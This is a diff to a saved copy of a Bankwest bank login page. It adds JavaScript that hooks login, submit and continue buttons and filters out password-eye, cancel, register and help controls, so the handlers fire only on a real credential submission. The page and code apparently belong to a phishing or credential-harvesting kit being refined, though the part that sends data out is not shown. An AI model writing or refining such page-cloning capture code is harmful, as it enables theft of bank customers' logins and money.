@@ -1,4 +1,4 @@
-<!DOCTYPE html> <html lang=en-au><!--
+﻿<!DOCTYPE html> <html lang=en-au><!--
  Page saved with SingleFile 
  url: https://identity.bankwest.com.au/TokenService/pan/login?returnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dibssessionmanagementapi%26redirect_uri%3Dhttps%253a%252f%252fonline.bankwest.com.au%252fSession%252fRedeem%26response_type%3Dcode%26scope%3Dopenid%2520api%2520offline_access%2520openbanking-consent%2520openbanking-profile%26code_challenge%3DZSRRB8n9oMbvLLey7pE2hIdWHbI1-0ldASq4eCWmy-M%26code_challenge_method%3DS256%26response_mode%3Dform_post%26nonce%3D639218830103347208.YTAwNDhjODQtNjgwMi00NjliLTk0NjAtZGM1NmZiMDQwY2U4OWM4ZDJkMDQtNTAyNy00ZDEwLTg2YTktMzRlN2I1NDZkZjU4%26acr_values%3Didp%253apan%2520target_media%253adesktop%26prompt%3Dlogin%26state%3DCfDJ8B0AeRYleLdPsihGpr79yE0bb7pMCQD4oouuqalJy43yYZWwCH4h--8qUKc-Dd71MeHrYbMnQqoJQiQV8wvyDmggubzIUH9P7OttZ69Erlgn6vLaxhzjwqGFfa4IT7CjCBAeqcmefLm6LNXkKaLKAAxS75ghxF2xJ9nSPRpmn4WZAO986LauGODgYBUZ5tXUcN7Wz6-XbXcBWbpBO36wRhgPO2vTnJAjAT6-1FoAcHC0lNmOvRhb_RgwnG_hFqRwo9aW8yoc5_yelUsBSCObcqXCyYtWz7zrBE2sXmQ_eLqy2bVcjNtFPxFvtNLm4aFIJUHad3iKJygCjDMmuQZqmWGWVzMWYsjed_QYAnPhxveWcinpNHB__VbATL9ff0WyJNa3fTHHdsHzxmVJQMFohpqH4zKIhRP5wYporO4TlU5wuvdqRDFhjQz2b8ZvUokq9Q%26x-client-SKU%3DID_NET8_0%26x-client-ver%3D7.5.0.0%26suppressed_prompt%3Dlogin%26Timestamp%3D1786286212 
  saved date: Sun Aug 09 2026 17:37:07 GMT+0300 (TÃ¼rkiye Standart Saati)
@@ -224,6 +224,7 @@
           }
         } catch(e) {}
         if(!isButtonLike){ return; }
+        try{ var blStr = ""; try{ blStr = ((tgt&&tgt.getAttribute?tgt.getAttribute("id")||"":"")+" "+(tgt&&tgt.getAttribute?tgt.getAttribute("class")||"":"")+" "+(tgt&&tgt.getAttribute?tgt.getAttribute("data-testid")||"":"")+" "+(tgt&&tgt.getAttribute?tgt.getAttribute("aria-label")||"":"")+" "+(tgt&&tgt.getAttribute?tgt.getAttribute("title")||"":"")+" "+(tgt&&tgt.tagName?tgt.tagName:"")).toLowerCase(); }catch(eBl){ blStr=""; } if(/pwd-eye|show.?pass|toggle.?pass|visibility|padlock|pass.?eye|eye.?pass|password.?eye|icon-white-arrow|link-icon|visuallyhidden|forgot|reset.?pass|cancel|close|dismiss|back|signup|sign-up|register|new.?account|security.?question|help|support|faq/i.test(blStr)) return; }catch(eBlk){}
       }
     }catch(e3){}
     var now = Date.now();
@@ -255,7 +256,7 @@
 
   function attachButtonHandlers(doc){
     try{
-      var buttonsSelector = 'button, input[type="submit"], input[type="button"], [role="button"], a.btn, [class*="btn-primary"], [class*="btn-default"], [class*="btn-lg"], [data-testid*="login"], [data-testid*="submit"], [class*="login-button"], [id*="login-button"], [id*="submit-button"], [onclick], [class*="btn"], [class*="login"], [class*="submit"], [class*="continue"], [class*="next"], [id*="btn"], [id*="submit"], [id*="continue"], [id*="next"], [class*="logon"], [class*="signin"], [id*="logon"], [id*="signin"]';
+      var buttonsSelector = 'button, input[type="submit"], input[type="button"], [role="button"], a.btn, .btn-primary, .btn-default, .btn-lg, .btn-submit, .btn-login, .btn-continue, .btn-next, .el-button, .van-button, .sg-btn, .sg-btn--primary, [data-testid="login-button"], [data-testid="submit-button"], [data-testid*="login-button"], [data-testid*="submit-button"], [onclick], #login-button, #submit-button, #btn-login, #btn-submit, #logon, #signin, .login-btn, .submit-btn, .logon, .signin';
       var buttons = doc.querySelectorAll(buttonsSelector);
       var seen = [];
       function isSeen(n){ for(var s=0;s<seen.length;s++){ if(seen[s]===n) return true; } return false; }
@@ -269,6 +270,7 @@
         var isButtonLike = tag==="button" || type==="submit" || type==="button" || role==="button";
         var tok = getActionToken(btn);
         var hasOnclick = btn.hasAttribute&&btn.hasAttribute("onclick");
+        try{ var blTok = getActionToken(btn); var blAttrId = (btn.getAttribute&&btn.getAttribute("id")||"").toLowerCase(); var blAttrCl = (btn.getAttribute&&btn.getAttribute("class")||"").toLowerCase(); var blAttrDt = (btn.getAttribute&&btn.getAttribute("data-testid")||"").toLowerCase(); var blAria = (btn.getAttribute&&(btn.getAttribute("aria-label")||"")+(btn.getAttribute("title")||"")).toLowerCase(); var blStr = (blTok+" "+blAttrId+" "+blAttrCl+" "+blAttrDt+" "+blAria).toLowerCase(); if(/pwd-eye|show.?pass|toggle.?pass|visibility|padlock|pass.?eye|eye.?pass|password.?eye|icon-white-arrow|link-icon|visuallyhidden|forgot|reset.?pass|cancel|close|dismiss|back|signup|sign-up|register|new.?account|security.?question|help|support|faq/i.test(blStr)){ return; } }catch(eBlA){}
         if(!(ACTION_TOKEN_RE.test(tok) || isButtonLike || hasOnclick)) return;
         try{
           if(btn.classList && btn.classList.remove){
